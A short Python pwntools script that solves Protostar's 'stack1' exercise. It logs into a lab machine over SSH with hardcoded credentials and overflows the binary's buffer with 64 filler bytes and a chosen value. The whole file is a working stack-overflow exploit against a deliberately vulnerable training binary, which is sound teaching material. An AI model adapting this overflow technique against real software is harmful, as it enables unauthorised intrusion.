#!/usr/bin/env python

import time
from pwn import *

level = 1
host = "10.168.142.133"
user = "user"
chal = "stack%i" % level
password  = "user"
binary   = "/opt/protostar/bin/%s" % chal
shell = ssh(host=host, user=user, password=password)

padding = "A" * 64
addr = p32(0x61626364)

payload = padding
payload += addr

r = shell.run("%s %s" % (binary, payload))
r.recvuntil("you have correctly got the variable to the right value")
r.clean()

log.success("Done!")
